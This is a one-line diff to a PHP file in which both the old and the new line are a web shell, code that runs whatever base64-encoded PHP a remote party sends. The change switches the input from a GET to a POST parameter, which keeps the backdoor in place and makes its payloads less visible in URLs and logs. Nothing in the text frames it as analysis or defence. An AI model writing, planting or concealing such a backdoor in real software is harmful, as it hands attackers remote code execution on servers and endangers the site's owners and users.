@@ -1,1 +1,1 @@
-<?php eval(base64_decode($_GET['param'])); ?>
+<?php eval(base64_decode($_POST['param'])); ?>
